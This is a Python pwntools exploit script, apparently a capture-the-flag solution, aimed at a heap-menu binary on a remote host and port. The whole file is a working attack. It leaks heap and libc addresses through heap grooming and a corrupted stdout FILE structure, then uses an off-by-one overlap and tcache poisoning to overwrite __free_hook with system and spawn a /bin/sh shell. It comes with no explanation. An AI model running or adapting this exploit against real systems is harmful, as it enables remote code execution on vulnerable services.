from pwn import*
context(os='linux',arch='amd64')
context.log_level=True
libc=ELF('libc-2.31.so')
#p = process(["./ld-2.27.so", "./a"],env={"LD_PRELOAD":"./libc-2.27.so"})
#p=process('./npuctf_pwn',env={'LD_PRELOAD':'./libc6_2.23.so'})
#p=process('./pwn')
p=remote('123.60.63.28',49154)
def add(size):
	p.recvuntil('>>')
	p.sendline('1')

	p.recvuntil('name length')
	p.sendline(str(size))

def edit(id,data):
	p.recvuntil('>>')
	p.sendline('2')
	p.recvuntil('idx')
	p.sendline(str(id))
	p.recvuntil('name:')
	p.send(str(data))
def delete(id):
	p.recvuntil('>>')
	p.sendline('3')
	p.recvuntil('idx')
	p.sendline(str(id))
def show(id):
	p.recvuntil('>>')
	p.sendline('4')
	p.recvuntil('idx')
	p.sendline(str(id))

add(0x418)
add(0xf8)
add(0xf8)
add(0x4f8)
add(0x4f8)
add(0xf8) #5
add(0xf8) #6
delete(1)
delete(2)
add(0xf8) #1
add(0xf8) #2
show(1)
p.recvuntil('ame:\n')
leak=u64(p.recv(6).ljust(8,'\x00'))
print hex(leak)
heap=leak-0x6c0




edit(0,p64(0)+p64(0x611)+p64(heap+0x2a0)*2)
edit(1,'\x01'*0xf8)
edit(1,'\x01'*0xf0+p64(0x610))


delete(3)
delete(5)
#delete(1)
delete(2)
add(0x408) #2
add(0x208) #3
edit(3,'\xa0\x06')
#gdb.attach(p)
#raw_input()
add(0xf8)  #3
add(0xf8)  #5
payload=p64(0x00000000fbad1887)+p64(0)*3+'\x00'
edit(7,payload)

p.recvuntil('\x00'*8)
leak=u64(p.recv(8))
print hex(leak)
libcbase=leak-(0x7ffff7fae980-0x00007ffff7dc3000)


delete(6)
delete(1)

free=libcbase+libc.sym['__free_hook'] #0x7ffff7fb1b28
edit(3,p64(0)*31+p64(0x101)+p64(free))
add(0xf8)  #1
add(0xf8)  #6
system=libcbase+libc.sym['system']
edit(1,'/bin/sh\x00')
edit(6,p64(system))
print hex(libcbase)
delete(1)
#
#


p.interactive()
